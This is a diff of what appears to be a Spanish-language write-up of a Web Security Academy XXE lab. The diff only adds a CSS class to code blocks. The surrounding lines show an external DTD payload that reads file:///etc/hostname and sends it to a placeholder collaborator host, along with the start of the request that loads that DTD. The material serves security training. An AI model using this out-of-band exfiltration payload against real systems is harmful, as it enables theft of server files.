@@ -24,7 +24,7 @@ tags:
 
 > 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
 
-<pre><code>&lt;!ENTITY % file SYSTEM "<mark>file:///etc/hostname</mark>"&gt;
+<pre class="payload"><code>&lt;!ENTITY % file SYSTEM "<mark>file:///etc/hostname</mark>"&gt;
 &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://<mark>COLLAB.oastify.com</mark>/?x=%file;'&gt;"&gt;
 %eval;
 %exfil;</code></pre>
@@ -38,7 +38,7 @@ tags:
 - "View exploit" → copiá `https://EXPLOIT.exploit-server.net/exploit.dtd`.
 
 ### 3. La request que carga el DTD externo
-<pre><code>POST /product/stock HTTP/1.1
+<pre class="payload"><code>POST /product/stock HTTP/1.1
 Host: <mark>TARGET.web-security-academy.net</mark>
 Content-Type: application/xml
 
